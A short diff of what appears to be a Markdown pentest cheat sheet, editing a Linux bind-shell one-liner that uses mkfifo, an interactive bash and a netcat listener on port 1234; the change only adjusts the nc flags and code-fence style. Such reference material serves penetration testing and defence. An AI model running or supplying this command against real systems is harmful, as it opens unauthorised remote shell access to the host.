@@ -1,6 +1,6 @@
 ### Linux
-```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+```shell-session
+$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -nlv 1234 >/tmp/f
 ```
 
 ```python
